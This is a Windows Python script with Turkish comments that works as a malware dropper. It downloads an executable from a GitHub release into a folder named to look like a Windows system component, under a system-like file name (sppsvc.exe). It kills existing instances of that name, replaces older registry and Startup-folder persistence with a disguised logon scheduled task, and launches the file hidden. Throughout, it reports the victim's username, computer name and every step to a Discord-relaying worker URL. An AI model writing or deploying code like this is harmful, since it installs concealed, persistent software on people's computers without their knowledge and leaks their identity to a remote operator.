import subprocess
import os
import winreg
import urllib.request
import win32com.client
import json
import datetime

# worker url ve bildirim fonksiyonu
WORKER_URL = "https://gentle-sky-3fe0.solitary-violet-8734.workers.dev/"

def send(title, desc, color):
    """worker'a discord embed bildirimi gonder"""
    embed = {
        "title": title,
        "description": desc,
        "color": color,
        "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        "footer": {"text": f"{os.getenv('USERNAME')}@{os.getenv('COMPUTERNAME')}"}
    }
    try:
        data = json.dumps({"embeds": [embed]}).encode("utf-8")
        req = urllib.request.Request(WORKER_URL, data=data, headers={
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        urllib.request.urlopen(req, timeout=10)
    except Exception:
        pass

# renk kodlari
GREEN = 5763719
RED = 15548997
YELLOW = 16776960
BLUE = 3447003

# hedef klasoru belirle
appdata = os.getenv("APPDATA")
target_dir = os.path.join(appdata, "werfault")
target_file = os.path.join(target_dir, "sppsvc.exe")
download_url = "https://github.com/atesemcukleyici/imsorryforthat/releases/download/adsads/sppsvc.exe"
startup_dir = os.path.join(appdata, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

send("⚙️ Baslatiliyor", "script calismaya basladi.", BLUE)

# once calisan tum sppsvc processlerini oldur
try:
    ps_cmd = "Get-CimInstance Win32_Process | Where-Object { $_.Name -eq 'sppsvc.exe' } | Select-Object -ExpandProperty ProcessId"
    result = subprocess.run(
        ["powershell", "-NoProfile", "-Command", ps_cmd],
        capture_output=True, text=True, encoding="utf-8", errors="replace", creationflags=subprocess.CREATE_NO_WINDOW
    )
    pids = [l.strip() for l in result.stdout.strip().splitlines() if l.strip()]
    if pids:
        killed = []
        for pid in pids:
            try:
                subprocess.run(
                    ["taskkill", "/F", "/PID", pid],
                    capture_output=True, text=True, encoding="utf-8", errors="replace", creationflags=subprocess.CREATE_NO_WINDOW
                )
                killed.append(pid)
            except Exception:
                pass
        send("🔪 Process Temizligi", f"calisan: {', '.join(pids)}\nolduruldu: {', '.join(killed)}", YELLOW)
    else:
        send("🔪 Process Temizligi", "calisan sppsvc process yok, temiz.", GREEN)
except Exception as e:
    send("❌ Process Kill Hatasi", str(e), RED)

# werfault klasorunu olustur ve sppsvc.exe indir
try:
    os.makedirs(target_dir, exist_ok=True)
    urllib.request.urlretrieve(download_url, target_file)
    send("📥 Indirme", f"basarili: {target_file}", GREEN)
except Exception as e:
    send("❌ Indirme Hatasi", str(e), RED)

# hedef exe listesini belirle
exe_list = []

if os.path.isfile(target_file):
    exe_list = [target_file]
else:
    if os.path.isdir(target_dir):
        for f in os.listdir(target_dir):
            full = os.path.join(target_dir, f)
            if f.lower().endswith(".exe"):
                exe_list.append(full)
    if not exe_list:
        send("❌ Exe Bulunamadi", f"klasorde exe yok: {target_dir}", RED)

# her exe icin islemleri yap
for exe_path in exe_list:
    exe_name = os.path.basename(exe_path)
    reg_name = os.path.splitext(exe_name)[0]

    # kayit defteri baslangic kayitlarini tamamen temizle
    try:
        startup_keys = [
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
        ]

        startup_apps = {}
        matching_entries = []
        for hive, key_path in startup_keys:
            try:
                key = winreg.OpenKey(hive, key_path, 0, winreg.KEY_READ)
                i = 0
                while True:
                    try:
                        name, value, _ = winreg.EnumValue(key, i)
                        startup_apps[name] = value
                        if exe_name.lower() in value.lower():
                            hive_name = "HKCU" if hive == winreg.HKEY_CURRENT_USER else "HKLM"
                            matching_entries.append((hive, key_path, name, value, hive_name))
                        i += 1
                    except OSError:
                        break
                winreg.CloseKey(key)
            except OSError:
                pass

        if matching_entries:
            deleted = []
            for hive, key_path, name, value, hive_name in matching_entries:
                try:
                    key = winreg.OpenKey(hive, key_path, 0, winreg.KEY_SET_VALUE)
                    winreg.DeleteValue(key, name)
                    winreg.CloseKey(key)
                    deleted.append(f"[{hive_name}] {name}")
                except Exception:
                    pass
            send("🗑️ Kayit Defteri", f"bulundu: {len(matching_entries)} kayit\nsilindi: {', '.join(deleted)}", YELLOW)
        else:
            send("📋 Kayit Defteri", "baslangic kaydi yok, temiz.", GREEN)

    except Exception as e:
        send("❌ Kayit Defteri Hatasi", str(e), RED)

    # startup klasorunde eski vbs kaldiysa temizle
    vbs_path = os.path.join(startup_dir, f"{reg_name}.vbs")
    try:
        if os.path.isfile(vbs_path):
            os.remove(vbs_path)
            send("🧹 Startup Temizligi", f"eski {reg_name}.vbs silindi.", YELLOW)
    except Exception as e:
        send("❌ VBS Temizleme Hatasi", str(e), RED)

    # gorev zamanlayicisi uzerinden baslangica alalim
    task_name = f"{reg_name}_startup"
    try:
        scheduler = win32com.client.Dispatch("Schedule.Service")
        scheduler.Connect()
        root_folder = scheduler.GetFolder("\\")

        task_def = scheduler.NewTask(0)
        task_def.RegistrationInfo.Description = f"{reg_name} service protection startup task"

        task_def.Settings.ExecutionTimeLimit = "PT0S"
        task_def.Settings.RunOnlyIfNetworkAvailable = True
        task_def.Settings.MultipleInstances = 2
        task_def.Settings.Enabled = True
        task_def.Settings.StartWhenAvailable = True
        task_def.Settings.DisallowStartIfOnBatteries = False
        task_def.Settings.StopIfGoingOnBatteries = False

        trigger = task_def.Triggers.Create(9)
        trigger.Enabled = True
        trigger.UserId = os.getenv("USERNAME")
        trigger.Delay = "PT1M"

        principal = task_def.Principal
        principal.LogonType = 3
        principal.RunLevel = 0

        action = task_def.Actions.Create(0)
        action.Path = exe_path
        action.WorkingDirectory = os.path.dirname(exe_path)

        root_folder.RegisterTaskDefinition(task_name, task_def, 6, None, None, 3)
        send("📅 Gorev Zamanlayicisi", f"task: {task_name}\nsure limiti: sinirsiz\ntetikleyici: oturum acildiginda (1dk gecikmeli)\nag: hazir olunca baslat\ncoklu ornek: engellendi", GREEN)
    except Exception as e:
        send("❌ Gorev Zamanlayicisi Hatasi", str(e), RED)

    # baslat
    try:
        proc = subprocess.Popen(
            [exe_path],
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
        )
        send("🚀 Baslatildi", f"{exe_name} calisiyor (PID: {proc.pid})", GREEN)
    except Exception as e:
        send("❌ Baslatma Hatasi", str(e), RED)

send("✅ Tamamlandi", "tum islemler bitti.", GREEN)
